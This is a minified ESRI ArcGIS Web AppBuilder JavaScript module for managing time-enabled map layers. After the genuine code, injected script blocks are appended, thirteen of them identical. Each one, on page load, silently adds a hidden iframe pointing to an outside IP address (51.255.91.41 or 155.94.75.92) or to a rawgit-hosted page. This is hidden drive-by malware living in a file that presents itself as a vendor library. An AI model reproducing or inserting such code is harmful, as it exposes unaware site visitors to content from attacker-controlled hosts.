// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define(["dojo/_base/declare","dojo/_base/lang","dojo/_base/array","dojo/Evented","dijit/_WidgetBase"],function(g,e,f,h,k){return g([k,h],{nls:null,map:null,layerInfosObj:null,setLayerInfosObj:function(a){this.layerInfosObj=a},processTimeDisableLayer:function(){var a=0,c,b,a=0;for(c=this.map.layerIds.length;a<c;a++)b=this.map.layerIds[a],b=this.map.getLayer(b),this._processTimeUpdate(b);a=0;for(c=this.map.graphicsLayerIds.length;a<c;a++)b=this.map.graphicsLayerIds[a],b=this.map.getLayer(b),this._processTimeUpdate(b)},
_processTimeUpdate:function(a){var c=null,c=!0,c=(c=this.layerInfosObj.getLayerInfoById(a.id))&&c.originOperLayer&&!1!==c.originOperLayer.timeAnimation;!c&&"setUseMapTime"in a&&a.setUseMapTime(!1)},hasVisibleTemporalLayer:function(){var a=0,c,b,a=0;for(c=this.map.layerIds.length;a<c;a++)if(b=this.map.layerIds[a],b=this.map.getLayer(b),this._isTimeTemporalLayer(b,!0))return!0;a=0;for(c=this.map.graphicsLayerIds.length;a<c;a++)if(b=this.map.graphicsLayerIds[a],b=this.map.getLayer(b),this._isTimeTemporalLayer(b,
!0))return!0;return!1},_isTimeTemporalLayer:function(a,c){var b=a&&a.timeInfo&&a.useMapTime,d=this.layerInfosObj.getLayerInfoById(a.id),d=d&&d.originOperLayer&&!1!==d.originOperLayer.timeAnimation;if(b&&d&&(c?a.visible:1))if("esri.layers.KMLLayer"===a.declaredClass){if(a=a.getLayers(),f.some(a,function(a){return a.timeInfo&&a.timeInfo.timeExtent?!0:!1}))return!0}else if(a.timeInfo&&a.timeInfo.timeExtent)return!0;return!1},_getVisibleTemporalLayerNames:function(){var a=0,c,b,d=[],a=0;for(c=this.map.layerIds.length;a<
c;a++)b=this.map.layerIds[a],b=this.map.getLayer(b),this._isTimeTemporalLayer(b,!0)&&d.push(b.id);a=0;for(c=this.map.graphicsLayerIds.length;a<c;a++)b=this.map.graphicsLayerIds[a],b=this.map.getLayer(b),this._isTimeTemporalLayer(b,!0)&&d.push(b.id);return f.map(d,e.hitch(this,function(a){return this.layerInfosObj.getLayerInfoById(a).title||""}))},_onLayerInfosIsShowInMapChanged:function(a){f.some(a,e.hitch(this,function(a){for(var b=null;!b;)b=this.map.getLayer(a.id),a=a.parentLayerInfo;return this.layerProcesser._isTimeTemporalLayer(b)}))&&
e.hitch(this,function(){this.layerProcesser._onTimeTemportalLayerChanged()})},_onLayerInfosChanged:function(a,c,b){"added"===c?(a=this.map.getLayer(b.id),this.layerProcesser._isTimeTemporalLayer(a,!0)&&e.hitch(this,function(){this.layerProcesser._onTimeTemportalLayerChanged()})):"removed"===c&&e.hitch(this,function(){this.layerProcesser._onTimeTemportalLayerChanged()})},_onTimeTemportalLayerChanged:function(){"closed"!==this.state&&(this.layerProcesser.hasVisibleTemporalLayer()?this.timeSlider?this.updateLayerLabel():
this.showTimeSlider():this.timeSlider&&this.closeTimeSlider())}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});